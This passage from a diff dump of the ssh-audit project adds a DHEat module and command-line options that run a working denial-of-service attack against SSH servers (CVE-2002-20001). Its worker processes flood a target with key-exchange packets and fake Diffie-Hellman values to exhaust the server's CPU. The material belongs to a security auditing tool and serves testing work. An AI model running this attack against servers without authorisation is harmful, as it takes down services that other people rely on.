          "434:             # If we were able to open connections at a rate greater than 25 per second, then we need to warn the user.",
          "435:             if rate > DHEat.MAX_SAFE_RATE:",
          "436:                 note = DHEat.DHEAT_WARNING.format(connections=num_opened_connections, time_elapsed=time_elapsed, rate=rate, max_safe_rate=DHEat.MAX_SAFE_RATE)",
          "438:         return note",
          "441:     def generate_kex(self, chosen_kex_alg: str) -> None:",
          "442:         '''Generates and sets the Key Exchange Init message we'll send to the server on each connection.'''",
          "444:         # The kex template we use is the server's own kex returned from an initial connection.  We'll only specify the first algorithm in each field for efficiency, since the server already told us it supports them.",
          "445:         wbuf = WriteBuf()",
          "446:         wbuf.write_list([chosen_kex_alg])",
          "447:         wbuf.write_list([self.kex.key_algorithms[0]] if len(self.kex.key_algorithms) > 0 else [])",
          "448:         wbuf.write_list([self.kex.client.encryption[0]] if len(self.kex.client.encryption) > 0 else [])",
          "449:         wbuf.write_list([self.kex.server.encryption[0]] if len(self.kex.server.encryption) > 0 else [])",
          "450:         wbuf.write_list([self.kex.client.mac[0]] if len(self.kex.client.mac) > 0 else [])",
          "451:         wbuf.write_list([self.kex.server.mac[0]] if len(self.kex.server.mac) > 0 else [])",
          "452:         wbuf.write_list([self.kex.client.compression[0]] if len(self.kex.client.compression) > 0 else [])",
          "453:         wbuf.write_list([self.kex.server.compression[0]] if len(self.kex.server.compression) > 0 else [])",
          "454:         wbuf.write_list([self.kex.client.languages[0]] if len(self.kex.client.languages) > 0 else [])",
          "455:         wbuf.write_list([self.kex.server.languages[0]] if len(self.kex.server.languages) > 0 else [])",
          "456:         wbuf.write_bool(self.kex.follows)",
          "457:         wbuf.write_int(self.kex.unused)",
          "458:         self.kex_init_body = wbuf.write_flush()",
          "461:     def get_largest_gex_modulus(self, server_gex_alg: str) -> int:",
          "462:         '''Probes the server for the largest modulus size it supports through group-exchange algorithms.'''",
          "464:         self.debug(\"Called get_largest_gex_modulus(%s).\" % server_gex_alg)",
          "466:         ssh_socket = SSH_Socket(self.out, self.target, self.port, timeout=self.connect_timeout, timeout_set=True)",
          "467:         new_kex = SSH2_Kex(self.out, self.kex.cookie, [server_gex_alg], self.kex.key_algorithms, self.kex.client, self.kex.server, False, unused=0)",
          "469:         # First, let's try a range of ridiculously large bits.  This is unlikely to work, but it would make things very interesting if they did!",
          "470:         ret: Dict[str, List[int]] = {}",
          "471:         if GEXTest.granular_modulus_size_test(self.out, ssh_socket, new_kex, 9216, 12288, 16384, ret) == exitcodes.GOOD and server_gex_alg in ret:",
          "473:             # Check that what the server accepted lies within the range we requested.",
          "474:             accepted_bits = ret[server_gex_alg][0]",
          "475:             if accepted_bits >= 9216:",
          "476:                 self.debug(\"get_largest_gex_modulus(%s) returning %u.\" % (server_gex_alg, accepted_bits))",
          "477:                 ssh_socket.close()",
          "478:                 return accepted_bits",
          "479:             else:",
          "480:                 self.debug(\"get_largest_gex_modulus(%s): received smaller bits (%u) than requested (9216 - 16384); continuing...\" % (server_gex_alg, accepted_bits))",
          "482:         # Check the largest bit sizes first, and stop the moment we find something the server supports.",
          "483:         for bits in [8192, 7680, 6144, 4096, 3072, 2048, 1024]:",
          "484:             ret.clear()",
          "485:             if GEXTest.granular_modulus_size_test(self.out, ssh_socket, new_kex, bits, bits, bits, ret) == exitcodes.GOOD and server_gex_alg in ret:",
          "487:                 # Check that what the server accepted lies within the range we requested.",
          "488:                 accepted_bits = ret[server_gex_alg][0]",
          "489:                 if accepted_bits == bits:",
          "490:                     self.debug(\"get_largest_gex_modulus(%s) returning %u.\" % (server_gex_alg, accepted_bits))",
          "491:                     ssh_socket.close()",
          "492:                     return accepted_bits",
          "493:                 self.debug(\"get_largest_gex_modulus(%s): received smaller bits (%u) than requested (%u); continuing...\" % (server_gex_alg, accepted_bits, bits))",
          "495:         # Our standard bit sizes failed above, so let's try a range from 1024 - 8192 as a last attempt...",
          "496:         ret.clear()",
          "497:         if GEXTest.granular_modulus_size_test(self.out, ssh_socket, new_kex, 1024, 4096, 8192, ret) == exitcodes.GOOD and server_gex_alg in ret:",
          "498:             accepted_bits = ret[server_gex_alg][0]",
          "499:             self.debug(\"get_largest_gex_modulus(%s) returning %u.\" % (server_gex_alg, accepted_bits))",
          "500:             ssh_socket.close()",
          "501:             return accepted_bits",
          "503:         # Total failure.  :(",
          "504:         return 0",
          "507:     def get_padding(self, payload: bytes) -> Tuple[int, bytes]:",
          "508:         '''Given a payload, returns the padding length and the padding.'''",
          "510:         pad_len = -(len(payload) + 5) % 8",
          "511:         if pad_len < 4:",
          "512:             pad_len += 8",
          "513:         padding = b\"\\x00\" * pad_len",
          "515:         return pad_len, padding",
          "518:     def make_dh_kexinit(self, chosen_alg: str, gex_msb: int = -1) -> bytes:",
          "519:         '''Makes a Diffie-Hellman Key Exchange Init packet.  Instead of calculating a real value for e, a random value less than p - 1 is constructed.'''",
          "521:         # Start with a zero-byte to signify that this is not a negative number.  The second byte must be 0xfe or smaller so as to ensure that our value of e < p - 1 (otherwise the server will reject it).  All bytes thereafter can be random.",
          "523:         message_code = b'\\x1e'  # Diffie-Hellman Key Exchange Init (30)",
          "524:         max_msb = 254  # The most significant byte for KEX must be between 0x00 and 0xFE (inclusive).",
          "525:         if gex_msb != -1:",
          "526:             message_code = b'\\x20'  # Diffie-Hellman Group Exchange Init (32)",
          "527:             max_msb = gex_msb - 1  # During the GEX negotiation, the server returned a custom p value.  Subtracting by 1 ensures e < p - 1.",
          "529:         if chosen_alg == \"ecdh-sha2-nistp256\":",
          "530:             e = DHEat.HARDCODED_NISTP256",
          "531:         elif chosen_alg == \"ecdh-sha2-nistp384\":",
          "532:             e = DHEat.HARDCODED_NISTP384",
          "533:         elif chosen_alg == \"ecdh-sha2-nistp521\":",
          "534:             e = DHEat.HARDCODED_NISTP521",
          "535:         else:",
          "536:             e = b\"\\x00\" + int.to_bytes(random.randint(0, max_msb), length=1, byteorder=\"big\") + os.urandom(self.e_rand_len)",
          "538:         payload = message_code + struct.pack(\"!L\", len(e)) + e",
          "539:         pad_len, padding = self.get_padding(payload)",
          "541:         return struct.pack(\"!LB\", len(payload) + pad_len + 1, pad_len) + payload + padding",
          "544:     def make_gex_request(self, gex_modulus_size: int) -> bytes:",
          "545:         '''Creates a Diffie-Hellman Group Exchange Request packet.'''",
          "547:         # Message code = 0x22 = Diffie-Hellman Group Exchange Request (34).",
          "548:         payload = b'\\x22' + struct.pack(\"!LLL\", gex_modulus_size, gex_modulus_size, gex_modulus_size)",
          "549:         pad_len, padding = self.get_padding(payload)",
          "551:         return struct.pack(\"!LB\", len(payload) + pad_len + 1, pad_len) + payload + padding",
          "554:     def make_kexinit(self) -> bytes:",
          "555:         '''Creates a complete Key Exchange Init packet, which contains the kex algorithm we're targeting, host keys & ciphers we support, etc.  The algorithms we claim to support is really the list that the server gave to us in order to guarantee that it will accept our message.'''",
          "557:         # Message code = 0x14 = Key Exchange Init (20).",
          "558:         payload = b'\\x14' + os.urandom(16) + self.kex_init_body",
          "559:         pad_len, padding = self.get_padding(payload)",
          "561:         return struct.pack(\"!LB\", len(payload) + pad_len + 1, pad_len) + payload + padding",
          "564:     def output(self, s: str = \"\") -> None:",
          "565:         self.out.info(s)",
          "568:     def read_banner(self, s: socket.socket) -> Tuple[bytes, bytes]:",
          "569:         '''Returns the server's banner.  Optionally returns extra bytes that came after the banner.'''",
          "571:         read_buffer = b''",
          "572:         newline_pos = -1",
          "573:         timer = time.time()",
          "574:         while newline_pos == -1:",
          "575:             if (time.time() - timer) >= self.read_timeout:",
          "576:                 return b'', b''",
          "578:             buf = b''",
          "579:             try:",
          "580:                 buf = s.recv(32)",
          "581:             except ConnectionResetError:",
          "582:                 return b'', b''",
          "583:             except socket.timeout:",
          "584:                 return b'', b''",
          "586:             if len(buf) == 0:",
          "587:                 return b'', b''",
          "589:             read_buffer += buf",
          "590:             newline_pos = read_buffer.find(b\"\\r\\n\")",
          "592:         extra = b''",
          "593:         if len(read_buffer) > newline_pos + 2:",
          "594:             extra = read_buffer[newline_pos + 2:]",
          "596:         return read_buffer[0:newline_pos], extra",
          "599:     def read_ssh_packet(self, s: socket.socket, extra: bytes = b'') -> Tuple[int, int]:",
          "600:         '''Reads an SSH packet and returns its message code.  When Diffie-Hellman Key Exchange Reply (31) packets are read, the most-significant byte of the GEX p-value is also returned.'''",
          "602:         extra_len = len(extra)",
          "603:         buf = b''",
          "604:         if extra_len < 5:",
          "605:             # self.debug(\"Obtaining lengths by reading %u bytes.\" % (5 - extra_len))",
          "606:             buf = s.recv(5 - extra_len)",
          "607:             if len(buf) == 0:",
          "608:                 return -1, -1",
          "610:             buf = extra + buf",
          "611:             extra = b''",
          "612:             extra_len = 0",
          "613:         else:",
          "614:             buf = extra[0:5]",
          "615:             extra = extra[5:]",
          "616:             extra_len = len(extra)",
          "618:         # self.debug(\"Unpacking lengths: %s\" % buf)",
          "619:         packet_len, padding_len = struct.unpack(\"!LB\", buf)  # pylint: disable=unused-variable",
          "620:         # self.debug(\"Packet len: %u; padding len: %u\" % (packet_len, padding_len))",
          "622:         packet_len -= 1",
          "623:         buf = extra + s.recv(packet_len - extra_len)",
          "624:         if buf == b\"\":",
          "625:             return -1, -1",
          "627:         message_code = buf[0]",
          "629:         # If this is a Diffie-Hellman Key Exchange Reply (31), then obtain the most-significant byte of the p-value returned.",
          "630:         gex_msb = -1",
          "631:         if message_code == 31 and len(buf) > 6:",
          "632:             gex_msb = buf[5] if buf[5] != 0 else buf[6]",
          "634:         return message_code, gex_msb",
          "637:     def run(self) -> None:",
          "638:         '''Main entrypoint for testing the server.'''",
          "641:         self.start_timer = time.time()",
          "643:         # Run against the server until the user presses CTRL-C, then dump statistics.",
          "644:         success = True",
          "645:         try:",
          "646:             success = self._run()",
          "647:         except KeyboardInterrupt:",
          "648:             pass",
          "650:         # Don't print statistics if it failed to run.",
          "651:         if not success:",
          "652:             return",
          "654:         # Print extensive statistics on what just happened.",
          "655:         seconds_running = time.time() - self.start_timer",
          "656:         print(\"\\n\\n\")",
          "657:         print(\"                      %s %sSTATISTICS%s %s\" % (self.BAR_CHART, self.WHITEB, self.CLEAR, self.CHART_UPWARDS))",
          "658:         print(\"                         %s----------%s\" % (self.WHITEB, self.CLEAR))",
          "659:         print()",
          "660:         print(\"                     Run time: %s%.1f seconds%s\" % (self.WHITEB, seconds_running, self.CLEAR))",
          "661:         print()",
          "662:         print(\"    Attempted TCP connections: %s%.1f/sec, %u total%s\" % (self.WHITEB, self.num_attempted_tcp_connections / seconds_running, self.num_attempted_tcp_connections, self.CLEAR))",
          "663:         print(\"   Successful TCP connections: %s%.1f/sec, %u total%s\" % (self.WHITEB, self.num_successful_tcp_connections / seconds_running, self.num_successful_tcp_connections, self.CLEAR))",
          "664:         print()",
          "665:         print(\"                Bytes written: %s%s/sec, %s total%s\" % (self.WHITEB, DHEat.add_byte_units(self.num_bytes_written / seconds_running), DHEat.add_byte_units(self.num_bytes_written), self.CLEAR))",
          "666:         print()",
          "667:         print(\"    Successful DH KEX replies: %s%.1f/sec, %u total%s\" % (self.WHITEB, self.num_successful_dh_kex / seconds_running, self.num_successful_dh_kex, self.CLEAR))",
          "668:         print(\"    Unexpected DH KEX replies: %s%.1f/sec, %u total%s\" % (self.WHITEB, self.num_failed_dh_kex / seconds_running, self.num_failed_dh_kex, self.CLEAR))",
          "669:         print()",
          "670:         print(\"OpenSSH-throttled connections: %s%.1f/sec, %u total%s\" % (self.WHITEB, self.num_openssh_throttled_connections / seconds_running, self.num_openssh_throttled_connections, self.CLEAR))",
          "671:         print(\"          Connection timeouts: %s%.1f/sec, %u total%s (timeout setting: %.1f sec)\" % (self.WHITEB, self.num_connect_timeouts / seconds_running, self.num_connect_timeouts, self.CLEAR, self.connect_timeout))",
          "672:         print(\"                Read timeouts: %s%.1f/sec, %u total%s (timeout setting: %.1f sec)\" % (self.WHITEB, self.num_read_timeouts / seconds_running, self.num_read_timeouts, self.CLEAR, self.read_timeout))",
          "673:         print(\"            Socket exceptions: %s%.1f/sec, %u total%s\" % (self.WHITEB, self.num_socket_exceptions / seconds_running, self.num_socket_exceptions, self.CLEAR))",
          "674:         print()",
          "675:         print()",
          "677:         if seconds_running < 3.0:",
          "678:             print(\"Total run time was under 3 seconds; try running it for longer to get more accurate analysis.\")",
          "679:         elif self.num_successful_tcp_connections / seconds_running < DHEat.MAX_SAFE_RATE:",
          "680:             print(\"Because the number of successful TCP connections per second (%.1f) is less than %.1f, it appears that the target is using rate limiting to prevent CPU exaustion.\" % (self.num_successful_tcp_connections / seconds_running, DHEat.MAX_SAFE_RATE))",
          "681:         else:",
          "682:             print(\"Because the number of successful TCP connections per second (%.1f) is greater than %.1f, it appears that the target is %sNOT%s using rate limiting to prevent CPU exaustion.\" % (self.num_successful_tcp_connections / seconds_running, DHEat.MAX_SAFE_RATE, DHEat.REDB, DHEat.CLEAR))",
          "684:         print()",
          "687:     def _run(self) -> bool:",
          "688:         '''Where all the magic happens.'''",
          "691:         self.output()",
          "692:         self.output(\"Running DHEat test against %s[%s]:%u%s with %s%u%s concurrent sockets...\" % (self.WHITEB, self.target, self.port, self.CLEAR, self.WHITEB, self.concurrent_connections, self.CLEAR))",
          "694:         # If the user didn't specify an exact kex algorithm to test, check our prioritized list against what the server supports.  Larger p-values (such as group18: 8192-bits) cause the most strain on the server.",
          "695:         chosen_alg = \"\"",
          "696:         gex_modulus_size = -1",
          "697:         if self.target_kex == \"\":",
          "699:             # Look through the server's kex list and see if any are GEX algorithms.  To save time, we will only check the first GEX we encounter, instead of all of them (I assume the results will be the same anyway).",
          "700:             server_gex_alg = \"\"",
          "701:             for server_kex in self.kex.kex_algorithms:",
          "702:                 if server_kex in DHEat.gex_algs:",
          "703:                     server_gex_alg = server_kex",
          "704:                     break",
          "706:             # If the server supports at least one gex algorithm, find the largest modulus it supports.  Store an entry in the alg_modulus_sizes so we remember this for later.",
          "707:             if server_gex_alg != \"\":",
          "708:                 # self.output(\"Analyzing server's group exchange algorithm, %s, to find largest modulus it supports...\" % (server_gex_alg))",
          "709:                 gex_modulus_size = self.analyze_gex(server_gex_alg)",
          "710:                 # self.output(\"The largest modulus supported by %s appears to be %u.\" % (server_gex_alg, largest_bit_modulus))",
          "712:             # Now choose the KEX/GEX with the largest modulus that is supported by the server.",
          "713:             chosen_alg = \"\"",
          "714:             for alg in DHEat.alg_priority:",
          "715:                 if alg in self.kex.kex_algorithms:",
          "716:                     chosen_alg = alg",
          "717:                     break",
          "719:             # If the server's kex options don't intersect with our prioritized algorithm list, then we cannot run this test.",
          "720:             if chosen_alg == \"\":",
          "721:                 self.out.fail(\"Error: server's key exchange algorithms do not match with any algorithms implemented by this client!\")",
          "722:                 self.out.warn(\"Server's key exchanges: \\n  * %s\" % (\"\\n  * \".join(self.kex.kex_algorithms)))",
          "723:                 self.out.warn(\"Client's key exchanges: \\n  * %s\" % (\"\\n  * \".join(DHEat.alg_priority)))",
          "724:                 return False",
          "726:             self.debug(\"Chose [%s] from prioritized list: [%s]\" % (chosen_alg, \", \".join(DHEat.alg_priority)))",
          "728:         else:  # The user specified an exact algorithm to test.",
          "730:             # If the user chose an algorithm we don't have an implementation for...",
          "731:             if (self.target_kex not in DHEat.alg_priority) and (self.target_kex not in DHEat.gex_algs):",
          "732:                 self.out.fail(\"Specified target key exchange [%s] is not in list of implemented algorithms: [%s].\" % (self.target_kex, \", \".join(DHEat.alg_priority)))",
          "733:                 return False",
          "735:             # Ensure that what the user chose is supported by the server.",
          "736:             if self.target_kex not in self.kex.kex_algorithms:",
          "737:                 self.out.fail(\"Specified target key exchange [%s] is not supported by the server: [%s].\" % (self.target_kex, \", \".join(self.kex.kex_algorithms)))",
          "738:                 return False",
          "740:             # If this is a GEX, find the largest modulus it supports.",
          "741:             if self.target_kex in DHEat.gex_algs:",
          "742:                 gex_modulus_size = self.analyze_gex(self.target_kex)",
          "744:             chosen_alg = self.target_kex",
          "746:         self.output(\"Targeting server algorithm: %s%s%s (modulus size: %u)\" % (self.WHITEB, chosen_alg, self.CLEAR, DHEat.alg_modulus_sizes[chosen_alg]))",
          "748:         if self.user_set_e_len and chosen_alg not in self.HARDCODED_ALGS:",
          "749:             self.output(\"Using user-supplied e length: %u\" % (self.e_rand_len))",
          "750:             if chosen_alg in self.COMPLEX_PQ_ALGS:",
          "751:                 self.output(\"{:s}NOTE:{:s} short e lengths can work against the post-quantum algorithm targeted, but the current implementation of this attack results in protocol errors; the number of successful DH KEX replies will be reported as zero even though the CPU will still be exhausted.\".format(self.YELLOWB, self.CLEAR))",
          "752:         elif self.user_set_e_len and chosen_alg in self.HARDCODED_ALGS:",
          "753:             self.output(\"{:s}NOTE:{:s} ignoring user-supplied e length, since the targeted algorithm (a NIST P-curve) must use hard-coded e values.\".format(self.YELLOWB, self.CLEAR))",
          "755:         # If an untested DH alg is chosen, ask the user to e-mail the maintainer/create a GitHub issue to report success.",
          "756:         if chosen_alg not in DHEat.tested_algs:",
          "757:             self.output()",
          "758:             self.output(DHEat.untested_alg_notice.format(color_start=self.YELLOWB, color_end=self.CLEAR, dh_alg=chosen_alg))",
          "760:         self.output()",
          "761:         self.output(\"Commencing denial-of-service attack.  Validate results by monitoring target's CPU idle status.\")",
          "762:         self.output()",
          "763:         self.output(\"Press CTRL-C to stop attack and see statistics.\")",
          "764:         self.output()",
          "766:         self.generate_kex(chosen_alg)",
          "768:         # If the user didn't already choose the e length, calculate the length of the random bytes we need to generate the value e that we'll send to the server.",
          "769:         if not self.user_set_e_len:",
          "770:             self.e_rand_len = int(DHEat.alg_modulus_sizes[chosen_alg] / 8) - 1",
          "771:             # self.debug(\"Setting e_rand_len to %u.\" % self.e_rand_len)",
          "773:         # Create all the processes.",
          "774:         multiprocessing.set_start_method(\"spawn\")",
          "775:         q: Any = multiprocessing.Queue()",
          "776:         for _ in range(0, self.concurrent_connections):",
          "777:             p = multiprocessing.Process(target=self.worker_process, args=(q, chosen_alg, gex_modulus_size,))",
          "778:             p.start()",
          "780:         spinner = [\"-\", \"\\\\\", \"|\", \"/\"]",
          "781:         spinner_index = 0",
          "783:         # Read the statistics from the child processes, and update the UI once per second.",
          "784:         last_update = time.time()",
          "785:         while True:",
          "787:             try:",
          "788:                 # Ensure an upper bound of 5 seconds without updating the UI.",
          "789:                 for _ in range(0, 5):",
          "790:                     thread_statistics = q.get(True, 1.0)  # Block for up to 1 second.",
          "791:                     self.num_attempted_tcp_connections += thread_statistics['num_attempted_tcp_connections']",
          "792:                     self.num_successful_tcp_connections += thread_statistics['num_successful_tcp_connections']",
          "793:                     self.num_successful_dh_kex += thread_statistics['num_successful_dh_kex']",
          "794:                     self.num_failed_dh_kex += thread_statistics['num_failed_dh_kex']",
          "795:                     self.num_bytes_written += thread_statistics['num_bytes_written']",
          "796:                     self.num_connect_timeouts += thread_statistics['num_connect_timeouts']",
          "797:                     self.num_read_timeouts += thread_statistics['num_read_timeouts']",
          "798:                     self.num_socket_exceptions += thread_statistics['num_socket_exceptions']",
          "799:                     self.num_openssh_throttled_connections += thread_statistics['num_openssh_throttled_connections']",
          "800:             except queue.Empty:  # If Queue.get() timeout exceeded.",
          "801:                 pass",
          "803:             now = time.time()",
          "804:             if (now - last_update) >= 1.0:",
          "805:                 seconds_running = now - self.start_timer",
          "806:                 print(\"%s%s%s TCP SYNs/sec: %s%u%s; Compl. conns/sec: %s%u%s; Bytes sent/sec: %s%s%s; DH kex/sec: %s%u%s    \\r\" % (self.WHITEB, spinner[spinner_index], self.CLEAR, self.BLUEB, self.num_attempted_tcp_connections / seconds_running, self.CLEAR, self.BLUEB, self.num_successful_tcp_connections / seconds_running, self.CLEAR, self.BLUEB, DHEat.add_byte_units(self.num_bytes_written / seconds_running), self.CLEAR, self.PURPLEB, self.num_successful_dh_kex / seconds_running, self.CLEAR), end=\"\")",
          "807:                 last_update = now",
          "808:                 spinner_index = (spinner_index + 1) % 4",
          "811:     def worker_process(self, q: Any, chosen_alg: str, gex_modulus_size: int) -> None:",
          "812:         '''Worker process that floods the target.'''",
          "814:         # Handle CTRL-C gracefully.",
          "815:         try:",
          "816:             self._worker_process(q, chosen_alg, gex_modulus_size)",
          "817:         except KeyboardInterrupt:",
          "818:             pass",
          "821:     def _worker_process(self, q: Any, chosen_alg: str, gex_modulus_size: int) -> None:",
          "822:         '''Worker process that floods the target.'''",
          "825:         def _close_socket(s: socket.socket) -> None:",
          "826:             try:",
          "827:                 s.shutdown(socket.SHUT_RDWR)",
          "828:                 s.close()",
          "829:             except OSError:",
          "830:                 pass",
          "833:         # Copy variables from the object (which might exist in another process?).  This might cut down on inter-process overhead.",
          "834:         connect_timeout = self.connect_timeout",
          "835:         target = self.target",
          "836:         port = self.port",
          "838:         # Determine if we are attacking with a GEX.",
          "839:         gex_mode = False",
          "840:         if chosen_alg in DHEat.gex_algs:",
          "841:             gex_mode = True",
          "842:             self.debug(\"Setting GEX mode to True; gex_modulus_size: %u\" % gex_modulus_size)",
          "844:         # Attack statistics local to this process.",
          "845:         num_attempted_tcp_connections = 0",
          "846:         num_successful_tcp_connections = 0",
          "847:         num_successful_dh_kex = 0",
          "848:         num_failed_dh_kex = 0",
          "849:         num_bytes_written = 0",
          "850:         num_connect_timeouts = 0",
          "851:         num_read_timeouts = 0",
          "852:         num_socket_exceptions = 0",
          "853:         num_openssh_throttled_connections = 0",
          "855:         num_loops_since_last_statistics_sync = 0",
          "856:         while True:",
          "857:             num_loops_since_last_statistics_sync += 1",
          "859:             # Instead of flooding the parent process with statistics, report our stats only every 5 connections.",
          "860:             if num_loops_since_last_statistics_sync > 5:",
          "861:                 num_loops_since_last_statistics_sync = 0",
          "863:                 q.put({",
          "864:                     'num_attempted_tcp_connections': num_attempted_tcp_connections,",
          "865:                     'num_successful_tcp_connections': num_successful_tcp_connections,",
          "866:                     'num_successful_dh_kex': num_successful_dh_kex,",
          "867:                     'num_failed_dh_kex': num_failed_dh_kex,",
          "868:                     'num_bytes_written': num_bytes_written,",
          "869:                     'num_connect_timeouts': num_connect_timeouts,",
          "870:                     'num_read_timeouts': num_read_timeouts,",
          "871:                     'num_socket_exceptions': num_socket_exceptions,",
          "872:                     'num_openssh_throttled_connections': num_openssh_throttled_connections,",
          "873:                 })",
          "875:                 # Since we sent our statistics, reset them all back to zero.",
          "876:                 num_attempted_tcp_connections = 0",
          "877:                 num_successful_tcp_connections = 0",
          "878:                 num_successful_dh_kex = 0",
          "879:                 num_failed_dh_kex = 0",
          "880:                 num_bytes_written = 0",
          "881:                 num_connect_timeouts = 0",
          "882:                 num_read_timeouts = 0",
          "883:                 num_socket_exceptions = 0",
          "884:                 num_openssh_throttled_connections = 0",
          "886:             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)",
          "887:             s.settimeout(connect_timeout)",
          "889:             # Loop until a successful TCP connection is made.",
          "890:             connected = False",
          "891:             while not connected:",
          "893:                 # self.debug(\"Connecting to %s:%d\" % (self.target, self.port))",
          "894:                 try:",
          "895:                     num_attempted_tcp_connections += 1",
          "896:                     s.connect((target, port))",
          "897:                     connected = True",
          "898:                 except OSError as e:",
          "899:                     self.debug(\"Failed to connect: %s\" % str(e))",
          "901:             # Send everything all at once.  This isn't technically valid to do, but SSH implementations seem to be fine with it.",
          "902:             bytes_to_write = b\"\"",
          "903:             if gex_mode:",
          "904:                 bytes_to_write = self.banner + self.make_kexinit() + self.make_gex_request(gex_modulus_size)",
          "905:             else:",
          "906:                 bytes_to_write = self.banner + self.make_kexinit() + self.make_dh_kexinit(chosen_alg)",
          "908:             try:",
          "909:                 s.sendall(bytes_to_write)",
          "910:                 num_bytes_written += len(bytes_to_write)",
          "911:             except (ConnectionResetError, BrokenPipeError):",
          "912:                 num_socket_exceptions += 1",
          "913:             except socket.timeout:",
          "914:                 num_connect_timeouts += 1",
          "916:             banner, extra = self.read_banner(s)",
          "917:             if banner == b'':",
          "918:                 self.debug(\"Blank banner received.\")",
          "919:                 _close_socket(s)",
          "920:                 num_socket_exceptions += 1",
          "921:                 continue",
          "923:             # If we receive a valid SSH banner from the server, we'll count it as a successful connection.  Note that OpenSSH returns \"Exceeded MaxStartups\" when throttling occurs (due to the MaxStartups setting).",
          "924:             if banner.startswith(b\"SSH-2.0-\") or banner.startswith(b\"SSH-1\"):",
          "925:                 num_successful_tcp_connections += 1",
          "926:             elif banner == b'Exceeded MaxStartups':",
          "927:                 num_openssh_throttled_connections += 1",
          "928:                 _close_socket(s)",
          "929:                 continue",
          "930:             else:",
          "931:                 self.debug(\"Invalid banner received: %r\" % banner)",
          "932:                 _close_socket(s)",
          "933:                 continue",
          "935:             # Read the KEXINIT from the server.",
          "936:             message_code = -1",
          "937:             try:",
          "938:                 message_code, _ = self.read_ssh_packet(s, extra=extra)",
          "939:                 # self.debug(\"Message code: %u\" % message_code)",
          "940:             except (ConnectionResetError, socket.timeout) as e:",
          "941:                 num_failed_dh_kex += 1",
          "942:                 num_socket_exceptions += 1",
          "943:                 _close_socket(s)",
          "944:                 self.debug(\"Exception in read_ssh_packet: %s\" % str(e))",
          "945:                 continue",
          "947:             # Ensure that we received Key Exchange Init (20).",
          "948:             if message_code != 20:",
          "949:                 num_failed_dh_kex += 1",
          "950:                 _close_socket(s)",
          "951:                 self.debug(\"Expected Kex Exchange Init (20), received: %u\" % message_code)",
          "952:                 continue",
          "954:             # Read the Diffie-Hellman Key Exchange Init from the server.",
          "955:             message_code = -1",
          "956:             try:",
          "957:                 message_code, gex_msb = self.read_ssh_packet(s)",
          "958:                 # self.debug(\"Message code: %u\" % message_code)",
          "959:             except (ConnectionResetError, socket.timeout) as e:",
          "960:                 num_failed_dh_kex += 1",
          "961:                 num_socket_exceptions += 1",
          "962:                 _close_socket(s)",
          "963:                 self.debug(\"Exception in read_ssh_packet: %s\" % str(e))",
          "964:                 continue",
          "966:             # If we get message code 31, then we know the server properly handled our Diffie-Hellman Key Exchange Init, and thus, wasted its time.",
          "967:             if message_code == 31:",
          "969:                 if not gex_mode:",
          "970:                     num_successful_dh_kex += 1",
          "972:                 # If we're targeting a GEX, we need to send and receive another set of packets.",
          "973:                 else:",
          "974:                     # Send the Diffie-Hellman Group Exchange Init (32).",
          "975:                     bytes_to_write = self.make_dh_kexinit(chosen_alg, gex_msb=gex_msb)",
          "976:                     try:",
          "977:                         s.sendall(bytes_to_write)",
          "978:                         num_bytes_written += len(bytes_to_write)",
          "979:                     except (ConnectionResetError, BrokenPipeError):",
          "980:                         num_socket_exceptions += 1",
          "981:                     except socket.timeout:",
          "982:                         num_connect_timeouts += 1",
          "984:                     try:",
          "985:                         message_code, _ = self.read_ssh_packet(s)",
          "986:                     except (ConnectionResetError, socket.timeout) as e:",
          "987:                         num_failed_dh_kex += 1",
          "988:                         num_socket_exceptions += 1",
          "989:                         _close_socket(s)",
          "990:                         self.debug(\"Exception in read_ssh_packet: %s\" % str(e))",
          "991:                         continue",
          "993:                     # If we received Diffie-Hellman Group Exchange Reply (33), then we know the server properly handled our Diffie-Hellman Group Exchange Init (32), and thus, wasted its time.",
          "994:                     if message_code == 33:",
          "995:                         num_successful_dh_kex += 1",
          "996:                     else:",
          "997:                         num_failed_dh_kex += 1",
          "999:             else:",
          "1000:                 num_failed_dh_kex += 1",
          "1002:             _close_socket(s)",
          "",
          "---------------"
        ],
        "src/ssh_audit/ssh_audit.py||src/ssh_audit/ssh_audit.py": [
          "File: src/ssh_audit/ssh_audit.py -> src/ssh_audit/ssh_audit.py",
          "--- Hunk 1 ---",
          "[Context before]",
          "27: import copy",
          "28: import getopt",
          "29: import json",
          "30: import os",
          "31: import re",
          "32: import sys",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "30: import multiprocessing",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "44: from ssh_audit.algorithms import Algorithms",
          "45: from ssh_audit.auditconf import AuditConf",
          "46: from ssh_audit.banner import Banner",
          "47: from ssh_audit import exitcodes",
          "48: from ssh_audit.fingerprint import Fingerprint",
          "49: from ssh_audit.gextest import GEXTest",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "48: from ssh_audit.dheat import DHEat",
          "",
          "---------------",
          "--- Hunk 3 ---",
          "[Context before]",
          "96:     uout.info('   -6,  --ipv6             enable IPv6 (order of precedence)')",
          "97:     uout.info('   -b,  --batch            batch output')",
          "98:     uout.info('   -c,  --client-audit     starts a server on port 2222 to audit client\\n                               software config (use -p to change port;\\n                               use -t to change timeout)')",
          "99:     uout.info('   -d,  --debug            debug output')",
          "100:     uout.info('   -g,  --gex-test=<x[,y,...]>  dh gex modulus size test')",
          "101:     uout.info('                   <min1:pref1:max1[,min2:pref2:max2,...]>')",
          "102:     uout.info('                   <x-y[:step]>')",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "101:     uout.info('        --conn-rate-test=N[:max_rate]  perform a connection rate test (useful')",
          "102:     uout.info('                                       for collecting metrics related to')",
          "103:     uout.info('                                       susceptibility of the DHEat vuln).')",
          "104:     uout.info('                                       Testing is conducted with N concurrent')",
          "105:     uout.info('                                       sockets with an optional maximum rate')",
          "106:     uout.info('                                       of connections per second.')",
          "108:     uout.info('        --dheat=N[:kex[:e_len]]    continuously perform the DHEat DoS attack')",
          "109:     uout.info('                                   (CVE-2002-20001) against the target using N')",
          "110:     uout.info('                                   concurrent sockets.  Optionally, a specific')",
          "111:     uout.info('                                   key exchange algorithm can be specified')",
          "112:     uout.info('                                   instead of allowing it to be automatically')",
          "113:     uout.info('                                   chosen.  Additionally, a small length of')",
          "114:     uout.info('                                   the fake e value sent to the server can')",
          "115:     uout.info('                                   be chosen for a more efficient attack (such')",
          "116:     uout.info('                                   as 4).')",
          "",
          "---------------",
